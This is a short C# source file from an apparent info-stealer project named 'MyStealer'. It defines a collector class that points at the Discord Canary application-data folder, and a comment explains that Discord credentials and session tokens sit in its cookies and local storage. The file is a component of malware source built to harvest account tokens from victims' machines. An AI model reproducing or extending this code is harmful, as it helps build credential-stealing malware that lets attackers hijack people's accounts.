using System.IO;
using System;

namespace MyStealer.Collector.Browser.ChromiumBased
{
    // Discord is not a browser; it's a messenger
    // but it uses CEF as backend, and all credentials and session tokens are stored in cookies & local storage
    public class DiscordCanary : Discord
    {
        public override string Name => "Discord Canary";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordcanary");
    }
}
